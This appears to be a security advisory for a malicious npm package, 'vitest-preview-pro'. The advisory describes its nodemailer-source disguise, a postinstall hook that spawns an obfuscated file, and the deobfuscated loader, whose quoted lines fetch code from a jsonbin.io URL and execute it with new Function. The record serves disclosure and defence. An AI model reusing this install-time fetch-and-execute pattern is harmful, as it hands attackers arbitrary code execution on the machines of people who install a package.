summary: Postinstall fetches and executes remote code from jsonbin.io via obfuscated loader
details: Package name `vitest-preview-pro` is a lure: the tarball ships nodemailer source (main `lib/nodemailer.js`, author string 'Andris Reinman') unrelated to any vitest preview functionality. The `postinstall` script runs `node lib/utils/index.js`, which detach-spawns `lib/utils/smtp-connection/index.js`. That file is heavily obfuscated (obfuscator.io `_0x`-style string array hiding constants) and, when deobfuscated, performs `axios.get('https://api.jsonbin.io/v3/b/6a709899da38895dfeb3bc72')` and then executes the returned `record.cookie` field via `new Function('require', data.record.cookie)(require)`. jsonbin.io is an anonymous, mutable JSON storage service; the fetched content is attacker-controlled and can change at any time. Installing this package causes arbitrary remote JavaScript to execute on the installer's machine with full Node privileges (network, filesystem, environment access) at install time.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
